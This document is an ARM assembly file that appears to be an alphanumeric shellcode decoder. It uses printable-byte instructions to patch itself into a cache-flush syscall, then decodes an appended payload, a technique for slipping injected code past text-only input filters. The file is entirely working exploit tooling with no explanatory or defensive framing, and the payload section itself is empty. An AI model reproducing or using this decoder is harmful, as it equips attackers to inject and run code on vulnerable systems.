.section .text
.global _start

_start:

/*
    R7, Read Pointer
    R3, to load
    Above 2 canbe interchanged

    R6, Write Pointer
    R5, to load

    R4 = 0
    R8 = -1
*/
    EORPLS R7, R4, #0x3F
    EORPLS R7, R4, #0x3F 
    EORPLS R7, R4, #0x3F
    EORPLS R7, R4, #0x3F
    EORPLS R7, R4, #0x3F
    EORPLS R7, R4, #0x3F 
    EORPLS R7, R4, #0x3F
    EORPLS R7, R4, #0x3F
    EORPLS R7, R4, #0x3F
    EORPLS R7, R4, #0x3F 
    EORPLS R7, R4, #0x3F
    EORPLS R7, R4, #0x3F
    EORPLS R7, R4, #0x3F
    EORPLS R7, R4, #0x3F 
    EORPLS R7, R4, #0x3F

    SUBPLS R3, PC, #33
    LDRPLB R3, [R3, #-35]

    SUBPLS R4, R3, #0x3F
    SUBPLS R6, R3, #0x3F
    SUBPL R5, R3, #0x40

    SUBPL R3, SP, #58   /* 57 = 24+C , where C=33 */

    /* Store 0x00000000 on stack */
    STRPLB R4, [R3, -R5, ROR #8]!
    STRPLB R4, [R3, -R5, ROR #8]!
    STRPLB R4, [R3, -R5, ROR #8]!
    STRPLB R4, [R3, -R5, ROR #8]!

    /* Store 0xffffffff on stack */
    STRPLB R5, [R3, -R5, ROR #8]!
    STRPLB R5, [R3, -R5, ROR #8]!
    STRPLB R5, [R3, -R5, ROR #8]!
    STRPLB R5, [R3, -R5, ROR #8]!

    /* Store 0x00000000 on stack */
    STRPLB R4, [R3, -R5, ROR #8]!
    STRPLB R4, [R3, -R5, ROR #8]!
    STRPLB R4, [R3, -R5, ROR #8]!
    STRPLB R4, [R3, -R5, ROR #8]!

    /* Store 0x00000000 on stack */
    STRPLB R4, [R3, -R5, ROR #8]!
    STRPLB R4, [R3, -R5, ROR #8]!
    STRPLB R4, [R3, -R5, ROR #8]!
    STRPLB R4, [R3, -R5, ROR #8]!

    /* Store 0xffffffff on stack */
    STRPLB R5, [R3, -R5, ROR #8]!
    STRPLB R5, [R3, -R5, ROR #8]!
    STRPLB R5, [R3, -R5, ROR #8]!
    STRPLB R5, [R3, -R5, ROR #8]!

    SUBPL R3, SP, #33   /* C=33, used above */
    LDMPLDB R3!, {R0, R1, R2, R6, R8, R14}

    /* Set R7 to SMIMI instruction, to start patching */
    EORPLS R5, R4, #0x30
    SUBPL R6, R4, #122
    SUBPL R6, R6, #102
    SUBPL R6, R6, #45
    SUBPL R7, PC, R6, ROR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R5, ROR R4
    STRPLB R3, [R7, #-33]

    /* R7+=1 */
    SUBPLS R7, R7, R8, LSR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R5, ROR R4
    STRPLB R3, [R7, #-33]

    /* R7+=1 */
    SUBPLS R7, R7, R8, LSR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R8, ROR R4
    STRMIB R3, [R7, #-33]

    /* R7 +=14 */
    EORMIS R6, R4, #0x40
    SUBPL R6, R6, #0x4E
    SUBPL R7, R7, R6, LSR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R5, ROR R4
    STRPLB R3, [R7, #-33]

    /* R7+=1 */
    SUBPLS R7, R7, R8, LSR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R5, ROR R4
    STRPLB R3, [R7, #-33]

    /* R7+=1 */
    SUBPLS R7, R7, R8, LSR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R5, ROR R4
    STRPLB R3, [R7, #-33]

    /* R7 +=90 */
    SUBPL R6, R4, #90
    SUBPL R7, R7, R6, LSR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R5, ROR R4
    EORPLS R3, R3, R8, ROR R4
    STRMIB R3, [R7, #-33]

    /* R7+=1 */
    SUBMIS R7, R7, R8, LSR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R5, ROR R4
    EORPLS R3, R3, R8, ROR R4
    STRMIB R3, [R7, #-33]

    /* R7+=1 */
    SUBMIS R7, R7, R8, LSR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R5, ROR R4
    EORPLS R3, R3, R8, ROR R4
    STRMIB R3, [R7, #-33]

    /* R7+=2 */
    SUBMIS R7, R7, R8, LSR R4
    SUBPLS R7, R7, R8, LSR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R5, ROR R4
    STRPLB R3, [R7, #-33]

    /* R7+=1 */
    SUBPLS R7, R7, R8, LSR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R5, ROR R4
    STRPLB R3, [R7, #-33]

    /* R7+=1 */
    SUBPLS R7, R7, R8, LSR R4

    /* Convert the byte */
    LDRPLB R3, [R7, #-33]
    EORPLS R3, R3, R8, ROR R4
    STRMIB R3, [R7, #-33]

    /* R7+=2 */
    SUBMIS R7, R7, R8, LSR R4
    SUBPLS R7, R7, R8, LSR R4

    /* Set R6=R7+2 */
    EORPLS R6, R7, R4, ROR R4
    SUBPLS R6, R6, R8, LSR R4
    SUBPLS R6, R6, R8, LSR R4
    
    /* To set MI flag, for executing SWIMI */
    SUBPLS R3, R8, R4, ROR R4

    /* SWIMI 0x9f0002 */
    /* .word 0x4f603032 */
    SVCMI 0x603032

    /* Change condition code to PL */
    EORMIS R3, R4, #33

loop:
    LDRPLB R3, [R7, #-33]
    SUBPLS R3, R3, #0x3F

    /* BMI payload_pre */
    .word 0x4A303026

    EORPLS R3, R4, R3, ROR #14

    SUBPLS R7, R7, R8, LSR R4

    LDRPLB R5, [R7, #-33]
    SUBPLS R5, R5, #0x3F
    EORPLS R3, R3, R5, ROR #20

    SUBPLS R7, R7, R8, LSR R4

    LDRPLB R5, [R7, #-33]
    SUBPLS R5, R5, #0x3F
    EORPLS R3, R3, R5, ROR #26

    SUBPLS R7, R7, R8, LSR R4

    LDRPLB R5, [R7, #-33]
    SUBPLS R5, R5, #0x3F
    EORPLS R3, R3, R5, LSR R4

    SUBPLS R7, R7, R8, LSR R4

    STRPLB R3, [R6, #-33]
    EORPL R3, R4, R3, ROR #8

    STRPLB R3, [R6, #-34]
    EORPL R3, R4, R3, ROR #8

    STRPLB R3, [R6, #-35]

    SUBPLS R6, R6, R8, LSR R4
    SUBPLS R6, R6, R8, LSR R4
    SUBPLS R6, R6, R8, LSR R4

    /* BPL loop */
    .word 0x5A30302A

payload_pre:
    /* SWIMI 0x9f0002 */
    .word 0x4f603032
payload:
